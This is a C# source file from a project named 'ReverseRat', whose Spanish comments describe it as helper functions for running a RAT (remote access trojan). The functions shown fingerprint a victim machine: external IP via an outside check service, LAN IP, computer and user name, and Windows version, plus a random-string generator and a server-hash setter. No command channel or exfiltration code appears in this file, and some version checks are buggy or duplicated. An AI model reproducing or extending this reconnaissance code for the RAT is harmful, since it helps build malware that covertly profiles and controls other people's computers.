using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;
using System.Net;
using System.Collections;
using System.IO;
using System.Diagnostics;



namespace ReverseRat
{

    // Funciones de todo tipo para operación del RAT
    class Funciones
    {

       public static string HashServer = "";
       public string ObtenerIP() // IP Externa y Lan
        {
            string IPExterna = "";
            String strHostName;
            // Getting Ip address of local machine...
            // First get the host name of local machine.
            strHostName = Dns.GetHostName();
            Console.WriteLine("Local Machine's Host Name: " + strHostName);
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostByName(strHostName);
            IPAddress[] addr = ipEntry.AddressList;
            WebClient client = new WebClient();
            // Add a user agent header in case the requested URI contains a query.
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
            string baseurl = "http://checkip.dyndns.org/";
            Stream data = client.OpenRead(baseurl);
            StreamReader reader = new StreamReader(data);
            string s = reader.ReadToEnd();
            data.Close();
            reader.Close();
            s = s.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").ToString();
            s = s.Substring(19);
            for (int j = 0; j < s.Length; j++)
            {
                if (char.IsDigit(s[j]) == true || s[j] == '.')
                {
                    IPExterna = IPExterna + s[j].ToString();
                }
            }
            return IPExterna + "/" + addr[0].ToString();
        }


       // Obtiene nombre de usuario y Nombre de PC
       public string ObtenPCUser() 
       {
           string NombreEquipo = "", NombreUsuario = "";
           NombreEquipo = Environment.MachineName;
           NombreUsuario = Environment.UserName;

           return NombreEquipo + "/" + NombreUsuario;
       }

       public string TipoSistemaOperativo()
       {
           OperatingSystem osInfo = Environment.OSVersion;
           string os = osInfo.ToString();
           string Sistema = "";
           try
           {
               if (os.Contains("Microsoft Windows NT 5.1.2600"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.1.2600", "Windows XP"));
               }
               if (os.Contains("Microsoft Windows 4.10.1998"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.1.2600", "Windows 98"));
               }
               if (os.Contains("Microsoft Windows 4.10.2222"))
               {
                   Sistema = (os.Replace("Microsoft Windows 4.10.2222", "Windows 98 SE"));
               }
               if (os.Contains("Microsoft Windows NT 5.0.2195"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.0.2195", "Windows 2000"));
               }
               if (os.Contains("Microsoft Windows 4.90.3000"))
               {
                   Sistema = (os.Replace("Microsoft Windows 4.90.3000", "Windows Me"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows XP 64-bit Edition 2003"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows Server 2003"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows XP Professional x64 Edition"));
               }
               if (os.Contains("Microsoft Windows NT 6.0.6001"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 6.0", "Windows Vista"));
               }
               if (os.Contains("Microsoft Windows NT 6.0.6002"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 6.0.6002", "Windows Vista Ultimate"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.4500"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 5.2.4500", "Windows Home Server"));
               }
               if (os.Contains("Microsoft Windows NT 6.1.7600"))
               {
                   Sistema = (os.Replace("Microsoft Windows NT 6.1.7600", "Windows 7"));
               }
           }
           catch (Exception k)
           {
               Sistema = ("Unknown OS");
           }
           return Sistema;
       }

        //Obtiene Cadena aleatoria mayusculas y minusculas
       public string RandomString(int size)
       {
           StringBuilder builder = new StringBuilder();
           Random random = new Random();
           char ch;
           for (int i = 0; i < size; i++)
           {
               ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
               builder.Append((random.Next(100) + 1) % 2  == 0 ? ch.ToString().ToLower() : ch.ToString().ToUpper());
           }     
           return builder.ToString();
       }


       public void Hola() // Manda un mensaje de texto
       {
           MessageBox.Show("hola");
       }

        public void AgregaHash(string cadHash)
        {
            HashServer = cadHash;
        }



    }


}
